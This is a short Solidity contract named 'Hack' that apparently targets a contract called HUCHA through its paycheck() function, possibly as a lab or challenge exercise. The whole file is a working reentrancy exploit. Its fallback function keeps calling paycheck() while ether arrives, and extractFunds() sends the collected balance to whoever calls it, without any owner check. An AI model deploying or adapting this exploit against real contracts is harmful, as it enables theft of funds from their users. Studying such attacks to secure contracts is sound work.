// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface HUCHA {

     function paycheck(uint) external;
}

contract Hack {
    HUCHA contrato;
    uint checkNumber;

    constructor(address _contract) {
        contrato = HUCHA(_contract);
    }

    function hack() public  {
        contrato.paycheck(checkNumber);
    }

        function setNumberCheck(uint _number) public  {
        checkNumber = _number;
    }

    fallback() external payable {
        if(address(this).balance <= 4 ether) {
           contrato.paycheck(checkNumber);
        }
    }

        function getbalance() view public returns(uint) 
    {
        return address(this).balance;
    }

        function getbalanceContract() view public returns(uint) 
    {
        return address(contrato).balance;
    }

        function extractFunds()  public 
    {
              payable(msg.sender).transfer(getbalance());
              
    }
}